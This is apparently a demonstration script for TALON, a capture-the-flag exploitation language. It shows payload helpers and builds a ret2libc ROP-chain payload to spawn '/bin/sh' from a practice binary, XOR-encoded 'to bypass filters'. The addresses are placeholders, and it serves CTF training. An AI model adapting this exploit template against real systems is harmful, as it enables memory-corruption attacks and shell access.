# New CTF Exploitation Functions Showcase
# Demonstrates all newly added human-readable DSL functions

print("======================================================================")
print("TALON - New CTF Exploitation Functions")
print("======================================================================")

# ========================================================================
# 1. FLAT_PACK - Pack multiple values into bytes
# ========================================================================
print("\n[1] flat_pack() - Flatten and pack ROP chains")

let pop_rdi = 0x401234
let bin_sh = 0x404040
let system = 0x401100

let rop_chain = flat([pop_rdi, bin_sh, system])
print("  ROP chain:", len(rop_chain), "bytes")
print("  First gadget:", hex(u64(rop_chain)))

# ========================================================================
# 2. FIT - Fit payload to specific size
# ========================================================================
print("\n[2] fit() - Fit payload to exact size")

let small_data = bytes("HELLO")
let fitted = fit(small_data, 100, 0x41)  # Pad to 100 bytes with 'A'
print("  Original size:", len(small_data))
print("  Fitted size:", len(fitted))

let large_data = cyclic(500)
let truncated = fit(large_data, 264, 0x42)
print("  Large data:", len(large_data))
print("  Truncated to:", len(truncated))

# ========================================================================
# 3. XOR - XOR encode/decode data
# ========================================================================
print("\n[3] xor() - XOR encoding")

let plaintext = bytes("SECRET_DATA")
let key = 0x42
let encrypted = xor(plaintext, key)
let decrypted = xor(encrypted, key)
print("  Plaintext:", plaintext)
print("  Encrypted:", enhex(encrypted))
print("  Decrypted:", decrypted)

# Multi-byte key
let key2 = bytes("KEY")
let enc2 = xor(plaintext, key2)
print("  Multi-byte XOR:", enhex(enc2))

# ========================================================================
# 4. ASM - Inline assembly
# ========================================================================
print("\n[4] asm() - Assemble inline code")

let shellcode = asm("
    nop
    nop
    xor rax, rax
    push rax
    pop rdi
    syscall
    ret
", "x64")
print("  Shellcode length:", len(shellcode), "bytes")
print("  Hex:", enhex(shellcode))

# ========================================================================
# 5. DISASM - Disassemble bytes
# ========================================================================
print("\n[5] disasm() - Disassemble bytecode")

let code = unhex("90 90 48 31 c0 50 5f 0f 05 c3")
let assembly = disasm(code, "x64")
print("  Assembly:\n", assembly)

# ========================================================================
# 6. ENHEX / UNHEX - Hex conversion
# ========================================================================
print("\n[6] enhex() / unhex() - Hex utilities")

let data = bytes("HELLO")
let hex_str = enhex(data)
let back = unhex(hex_str)
print("  Data:", data)
print("  Hex:", hex_str)
print("  Back:", back)

# ========================================================================
# 7. ROL / ROR - Bit rotation
# ========================================================================
print("\n[7] rol() / ror() - Bit rotation")

let value = 0xdeadbeef
let rotated_left = rol(value, 8)
let rotated_right = ror(value, 8)
print("  Original:", hex(value))
print("  ROL 8:", hex(rotated_left))
print("  ROR 8:", hex(rotated_right))

# ========================================================================
# 8. BITS / UNBITS - Binary representation
# ========================================================================
print("\n[8] bits() / unbits() - Binary conversion")

let num = 42
let binary = bits(num, 8)
let back_num = unbits(binary)
print("  Number:", num)
print("  Binary:", binary)
print("  Back:", back_num)

# ========================================================================
# 9. PAUSE - Interactive debugging
# ========================================================================
print("\n[9] pause() - Interactive debugging")
print("  Use pause() to stop execution for inspection")
# pause()  # Uncomment to test

# ========================================================================
# 10. Combined CTF Exploit Example
# ========================================================================
print("\n[10] Complete CTF Exploit Example")
print("======================================================================")

# Binary analysis
let binary = "./vuln_binary"  # Compile from vuln.c in examples/
print("[*] Target binary:", binary)

# Find offset
let pattern_size = 200
let pattern = cyclic(pattern_size)
print("[*] Pattern size:", pattern_size)

# Assume crash at offset 136
let offset = 136
print("[*] Crash offset:", offset)

# Build ROP chain
let libc_base = 0x7ffff7a00000
let system_offset = 0x4f440
let binsh_offset = 0x1b3e9a
let pop_rdi_offset = 0x2155f

let system_addr = libc_base + system_offset
let binsh_addr = libc_base + binsh_offset
let pop_rdi_addr = libc_base + pop_rdi_offset
let ret_addr = libc_base + 0x1016  # Stack alignment

print("[*] System:", hex(system_addr))
print("[*] /bin/sh:", hex(binsh_addr))
print("[*] pop rdi:", hex(pop_rdi_addr))

# Construct payload
let padding = fit(bytes(""), offset, 0x41)
let rop = flat([pop_rdi_addr, binsh_addr, ret_addr, system_addr])
let payload = padding + rop

print("[*] Payload size:", len(payload), "bytes")
print("[*] Payload structure:")
print("    - Padding:", len(padding), "bytes")
print("    - ROP chain:", len(rop), "bytes")

# Optional: XOR encode to bypass filters
let encoded_payload = xor(payload, 0x42)
print("[*] Encoded payload:", len(encoded_payload), "bytes")

# Optional: Fit to exact buffer size
let final_payload = fit(payload, 300, 0x00)
print("[*] Final payload:", len(final_payload), "bytes")

print("\n[+] Payload ready for delivery!")

# ========================================================================
# 11. Advanced Techniques
# ========================================================================
print("\n[11] Advanced Techniques")
print("======================================================================")

# Shellcode generation and encoding
let basic_nops = asm("nop\nnop\nnop\nnop", "x64")
print("[*] Basic NOP sled:", enhex(basic_nops))

# Bit manipulation for bypasses
let original = 0x41414141
let obfuscated = rol(original, 13)
print("[*] Obfuscated value:", hex(obfuscated))
print("[*] De-obfuscated:", hex(ror(obfuscated, 13)))

# Multi-stage payload
let stage1 = bytes("STAGE1")
let stage2 = bytes("STAGE2")
let combined = flat([stage1, stage2])
print("[*] Multi-stage payload:", len(combined), "bytes")

# ========================================================================
# Summary
# ========================================================================
print("\n" + "=" * 70)
print("Summary: All new functions demonstrated successfully!")
print("======================================================================")
print("\nNew functions added:")
print("  - flat() / flat_pack()  : Pack multiple values to bytes")
print("  - fit()                 : Fit payload to exact size")
print("  - xor()                 : XOR encode/decode")
print("  - asm()                 : Inline assembly")
print("  - disasm()              : Disassemble bytes")
print("  - enhex() / unhex()     : Hex conversion utilities")
print("  - rol() / ror()         : Bit rotation")
print("  - bits() / unbits()     : Binary conversion")
print("  - pause()               : Interactive debugging")
print("\nThese functions make TALON significantly more powerful for CTF!")
